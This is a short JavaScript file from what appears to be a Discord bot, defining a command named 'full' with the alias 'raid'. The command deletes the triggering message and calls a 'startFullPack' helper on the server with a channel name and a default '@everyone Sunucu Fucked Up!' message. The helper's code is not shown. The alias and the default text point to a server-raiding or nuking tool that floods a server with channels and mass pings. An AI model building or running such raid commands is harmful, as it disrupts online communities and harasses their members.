const { isAuthorized, startFullPack } = require("../../utils/serverTemplate");

module.exports = {
  name: "full",
  aliases: ["raid"],
  async execute(message, args, client) {
    if (!isAuthorized(message.member, message.author.id, client.config.ownerId)) {
      return;
    }

    const channelName = args[0] || "oxyonthebeat";
    const content = args.slice(1).join(" ") || "@everyone Sunucu Fucked Up!";

    await message.delete().catch(() => { });

    await startFullPack(message.guild, channelName, content);
  }
};
